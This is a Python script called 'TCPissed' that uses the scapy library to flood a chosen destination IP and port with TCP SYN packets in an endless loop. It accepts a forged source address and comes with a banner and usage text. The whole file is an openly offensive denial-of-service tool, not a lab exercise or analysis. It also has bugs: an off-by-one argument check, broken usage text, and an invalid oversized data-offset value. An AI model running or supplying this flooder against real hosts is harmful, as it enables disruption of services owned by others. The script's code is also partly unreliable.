#!/usr/bin/env python3

from scapy.all import *
import sys
import random

def help():
    print("""
    
    TCPissed Documentation: 
        
    Usage: ./TCPissed.py <source_IP <destination_IP> <source_Port <destination_Port>
          """)

def banner():
    print("""
     ________________  _                    __
  /_  __/ ____/ __ \(_)____________  ____/ /
    / / / /   / /_/ / / ___/ ___/ _ \/ __  / 
   / / / /___/ ____/ (__  |__  )  __/ /_/ /  
  /_/  \____/_/   /_/____/____/\___/\__,_/   
          """)

def main():

    #Removes Script Name from "args"
    args = sys.argv[1:]

    #  3 = all args
    if(len(args) < 3):
      help()
      sys.exit(2)
  
    banner()
    source_IP = str(args[0])
    destination_IP = str(args[1])
    source_port = int(args[2])
    destination_port = int(args[3])

    #Fills Packet with random data
    message = random.randint(9999999999999, 9999999999999999999999999)

    #Builds IP Layer of Flood Packet
    ip_packet = IP(src=source_IP, dst=destination_IP)
    #Builds TCP Layer of Flood Packet
    tcp_packet = TCP(sport=source_port, dport=destination_port, flags="S", seq=0, ack=0, dataofs=message)



    print("[*] Starting SYN Flood [*]")
    packet = 0
    print("\n")
    while(True):
            send(ip_packet/tcp_packet, verbose=False)
      #Prints total number of packets
            print("{}".format(str(packet)), end="\r")
            packet = packet + 1
            
            

main()
